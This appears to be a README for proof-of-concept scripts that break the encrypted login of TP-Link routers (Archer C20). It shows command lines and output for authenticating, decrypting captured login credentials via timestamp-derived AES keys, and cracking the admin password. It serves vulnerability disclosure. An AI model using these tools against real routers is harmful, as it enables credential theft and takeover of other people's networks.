# TP-Link GDPR

Scripts that break TP-Link's attempt at GDPR compliance. To learn more, visit the full write-up [here](https://hex.fish/2021/05/10/tp-link-gdpr/).

## Authenticate

```text
python3 authenticate.py 192.168.0.1 password123
[*] Connecting to router at 192.168.0.1
[+] Found supported device: Archer C20 AC750 Wireless Dual Band Router
[+] RSA n: E70029629FA45445EC5D1048E287E98839A2B481E8E83940BB8C339515C57B197D8F593F4806E51829C69116A41002125EFEF7D0DB73DA8CC98A931903ED4D35
[+] RSA e: 010001
[+] Sequence: 488263223
[*] Setting AES key to AAAAAAAAAAAAAAAA
[*] Setting AES IV to BBBBBBBBBBBBBBBB
[+] JSESSIONID: 69edac0c5021e874e4b436fdded7f4
[+] Successfully authenticated with the router
```

## Decrypt Credentials

```text
python3 decrypt_creds.py ./bin/login.pcapng
[+] Found a login packet
[*] Login request packet captured at Unix epoch time 1618851624.846030723
[+] AES Key: 1618851624837207
[+] AES IV: 1618851624837491
8
[/cgi/login#0,0,0,0,0,0#0,0,0,0,0,0]0,2
username=admin
password=password123
```

## Password Crack

```text
python3 password_crack.py
Cracked the password after 3 attempts. The password is "password123", enjoy!
```
